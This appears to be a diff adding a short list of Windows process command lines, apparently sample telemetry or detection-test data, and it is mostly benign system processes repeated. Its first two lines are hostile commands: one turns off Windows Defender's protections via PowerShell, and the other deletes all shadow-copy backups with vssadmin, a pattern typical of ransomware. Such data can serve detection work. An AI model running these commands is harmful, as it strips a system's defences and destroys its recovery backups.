@@ -1,0 +1,22 @@
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true"
+vssadmin delete shadows /all /quiet
+%WINDIR%\system32\WerFault.exe -u -p 1184 -s 1100
+%WINDIR%\system32\WerFault.exe -u -p 1184 -s 1100
+%WINDIR%\system32\WerFault.exe -u -p 1184 -s 1100
+%WINDIR%\system32\WerFault.exe -u -p 1184 -s 1100
+%WINDIR%\system32\wbem\wmiprvse.exe -secured -Embedding
+%WINDIR%\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+%WINDIR%\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+%WINDIR%\system32\wbem\wmiprvse.exe -secured -Embedding
+%WINDIR%\system32\wbem\wmiprvse.exe -secured -Embedding
+%WINDIR%\system32\wbem\wmiprvse.exe -secured -Embedding
+%WINDIR%\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+%WINDIR%\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+%WINDIR%\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+%WINDIR%\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+%WINDIR%\system32\vssvc.exe
+%WINDIR%\system32\vssvc.exe
+%WINDIR%\System32\svchost.exe -k swprv
+%WINDIR%\System32\svchost.exe -k swprv
+%WINDIR%\system32\sppsvc.exe
+%WINDIR%\system32\sppsvc.exe
